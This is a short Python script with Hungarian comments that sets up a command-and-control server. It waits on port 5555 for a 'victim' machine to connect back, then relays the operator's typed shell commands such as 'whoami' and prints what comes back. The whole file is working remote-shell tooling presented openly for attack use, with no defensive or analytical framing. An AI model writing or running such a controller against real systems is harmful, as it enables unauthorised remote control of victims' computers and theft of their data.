import socket

# --- KONFIGURÁCIÓ ---
# A 0.0.0.0 azt jelenti: "figyelj minden hálózati kártyán"
HOST = "0.0.0.0"
PORT = 5555  # Ezen a kapun várjuk az áldozatot

def start_server():
    print(f"--- 📡 C2 SERVER INDÍTÁSA (Port: {PORT}) ---")
    print("[*] Várakozás az áldozatra...")

    # Socket létrehozása
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Újrahasznosítható port (hogy ne kelljen várni újraindításkor)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.bind((HOST, PORT))
    s.listen(1) # Egyszerre 1 áldozatot várunk

    # Itt a program megáll és vár, amíg valaki nem csatlakozik
    conn, addr = s.accept()
    print(f"\n[+] KAPCSOLAT LÉTREJÖTT! Áldozat IP: {addr[0]}")
    print("[*] Írj be parancsokat (pl. 'dir', 'whoami'). Kilépés: 'exit'")

    while True:
        # 1. Bekérjük a parancsot tőled
        command = input("Shell> ")
        
        if command.lower() == "exit":
            conn.send("exit".encode())
            break
        
        if command == "": continue

        # 2. Elküldjük a parancsot az áldozatnak
        conn.send(command.encode())

        # 3. Várjuk a választ (eredményt)
        # 4096 byte-ot olvasunk egyszerre (puffer)
        result = conn.recv(4096).decode()
        print(result)

    conn.close()
    s.close()

if __name__ == "__main__":
    start_server()